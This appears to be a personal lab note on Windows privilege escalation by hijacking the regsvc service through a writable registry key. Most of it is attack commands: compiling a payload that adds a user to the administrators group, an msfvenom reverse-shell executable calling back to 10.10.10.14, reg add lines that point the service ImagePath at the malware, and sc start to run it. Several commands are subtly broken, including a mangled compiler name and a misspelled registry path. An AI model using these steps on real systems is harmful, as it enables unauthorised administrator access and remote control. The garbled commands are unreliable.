-- -
[[Dark Arts/Privesc/Windows/Enumeration/Regsvc ACL|Enum]]
#### Payload
The payload can do anything I believe, in our example case it will be a C file that will run the system command `cmd.exe /k net localgroup administrators user /add` to add `user` to the `administrators` group. 

**Note for later, copy the C file [[Dark Arts I/Useful Code/~Home|here]] when doing the lab, make sure to link it here**
To compile above linked code `windows_service.c` :
```bash
# install compiler if necessary
sudo apt install gcc-mingw-w64

# compile
x86_64 -w64-mingw-gcc windows_service.c -o x.exe
```

You can also just make a reverse shell with msfvenvom:
```bash
msfvenom -p windows/x64/reverse_tcp lhost=10.10.10.14 lport=9001 -f exe -o x.exe
```
[[Dark Arts I/File Transfer/Windows|File transfer]] malware executable to the target windows box
#### Exploit
For this example, payload `x.exe` was transferred to `C:\Temp`
```powershell
# add malware to registry
reg add HKLM\SYSTEM\CurrentControlSet\Sservices\regsvc /v ImagePath /t REG_EXPAND_SZ /d <path to malware> /f 

reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f 

# start the service
sc start regsvc

# You should have caught a reverse shell if you went with that, if you went with the user add and windows_service.c, then confirm "user" was added to "administrators" group:
net localgroup administrators

# then log in as "user"
```